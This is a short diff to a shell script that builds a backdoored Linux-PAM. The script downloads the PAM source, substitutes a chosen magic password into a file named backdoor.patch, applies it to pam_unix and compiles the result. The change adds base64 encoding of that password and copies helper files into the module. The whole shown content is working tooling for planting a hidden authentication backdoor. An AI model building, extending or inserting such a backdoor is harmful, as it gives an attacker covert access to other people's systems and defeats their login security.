@@ -41,6 +41,8 @@ if [ -z $PASSWORD ]; then
 	exit 1
 fi;
 
+B64PASSWORD=`echo $PASSWORD | base64`
+
 echo "PAM Version: $PAM_VERSION"
 echo "Password: $PASSWORD"
 echo ""
@@ -57,7 +59,8 @@ fi
 wget -c "${PAM_BASE_URL}/${PAM_FILE}"
 
 tar xjf $PAM_FILE
-cat backdoor.patch | sed -e "s/_PASSWORD_/${PASSWORD}/g" | patch -p1 -d $PAM_DIR
+cp -rv deps/b64/* $PAM_DIR/modules/pam_unix/
+cat backdoor.patch | sed -e "s/_PASSWORD_/${B64PASSWORD}/g" | patch -p1 -d $PAM_DIR
 cd $PAM_DIR
 ./configure
 make
